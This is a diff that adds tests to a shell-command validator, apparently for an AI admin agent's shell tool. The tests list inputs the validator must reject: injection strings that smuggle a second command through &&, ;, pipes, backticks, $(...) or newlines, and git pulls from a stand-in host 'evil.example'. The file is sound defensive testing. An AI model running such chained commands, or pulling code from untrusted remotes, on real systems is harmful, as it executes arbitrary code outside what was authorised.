@@ -126,6 +126,65 @@ describe("shell validator — destructive command blocks", () => {
   });
 });
 
+describe("shell validator — chaining and code execution (2026-10 hardening)", () => {
+  // Each of these passed the old validator and would have run an arbitrary
+  // command through the system shell.
+  for (const cmd of [
+    "git status && powershell -NoProfile -Command whoami",
+    "git status & calc",
+    "git status ; whoami",
+    "git status | findstr x",
+    "git log `whoami`",
+    "git log $(whoami)",
+    "npm run build > out.txt",
+    "git status\nwhoami",
+    "git log %USERPROFILE%",
+  ]) {
+    it(`blocks chained/expanded command: ${JSON.stringify(cmd)}`, () => {
+      assert.ok(validateShellCommand(cmd));
+    });
+  }
+
+  it("blocks running script files with node or ts-node", () => {
+    assert.ok(validateShellCommand("node workspace/script.js"));
+    assert.ok(validateShellCommand("node"));
+    assert.ok(validateShellCommand("npx ts-node workspace/script.ts"));
+  });
+
+  it("blocks npm scripts other than build/test and dependency rewrites", () => {
+    assert.ok(validateShellCommand("npm run start"));
+    assert.ok(validateShellCommand("npm run setup"));
+    assert.ok(validateShellCommand("npm audit fix --force"));
+    assert.ok(validateShellCommand("npm update"));
+    assert.equal(validateShellCommand("npm run test"), null);
+    assert.equal(validateShellCommand("npm audit"), null);
+  });
+
+  it("blocks pulling from anywhere but origin, and adding remotes", () => {
+    assert.ok(validateShellCommand("git pull https://evil.example/repo main"));
+    assert.ok(validateShellCommand("git pull git@evil.example:x/y main"));
+    assert.ok(validateShellCommand("git remote add evil foo/bar"));
+    assert.ok(validateShellCommand("git fetch upstream"));
+    assert.equal(validateShellCommand("git pull origin master"), null);
+    assert.equal(validateShellCommand("git remote -v"), null);
+  });
+
+  it("still allows the guide bot's maintenance commands", () => {
+    for (const cmd of ["npm run build", "npx tsc --noEmit", "node --version", "git log --oneline -5", "pm2 logs admin-agent --lines 30"]) {
+      assert.equal(validateShellCommand(cmd), null, cmd);
+    }
+  });
+});
+
+describe("shell tool — off unless an admin opts in", () => {
+  it("is disabled when SHELL_TOOL_ENABLED is unset", async () => {
+    // Module state is read at import; the test runner doesn't set the variable.
+    const { isShellToolEnabled } = await import("../src/tools/shell.js");
+    assert.equal(process.env.SHELL_TOOL_ENABLED ?? "", "");
+    assert.equal(isShellToolEnabled(), false);
+  });
+});
+
 describe("shell validator — input limits", () => {
   it("blocks excessively long commands", () => {
     const long = "npm " + "x".repeat(500);
